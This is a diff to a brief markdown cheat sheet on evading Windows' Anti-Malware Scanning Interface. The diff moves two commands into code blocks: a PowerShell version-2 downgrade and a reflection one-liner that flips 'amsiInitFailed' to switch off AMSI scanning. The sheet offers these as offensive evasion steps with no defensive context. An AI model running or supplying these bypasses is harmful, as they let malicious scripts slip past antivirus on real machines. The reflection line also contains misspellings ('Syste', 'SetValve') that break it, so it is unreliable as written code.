@@ -1,12 +1,16 @@
-# Anti-Malware Scanning Interface (AMSI) Evasion
+# Anti-Malware Scanning Interface (AMSI) Evasion (Runtime Detection Evasion)
 
 ## Powershell Downgrade
 
-#### powershell -Version 2
+#### 
+
+    powershell -Version 2
 
 ## Powershell Reflection
 
-#### [Ref].Assembly.GetType('Syste.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValve($null,$true)
+#### 
+
+    [Ref].Assembly.GetType('Syste.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValve($null,$true)
 
 ## Automation
 
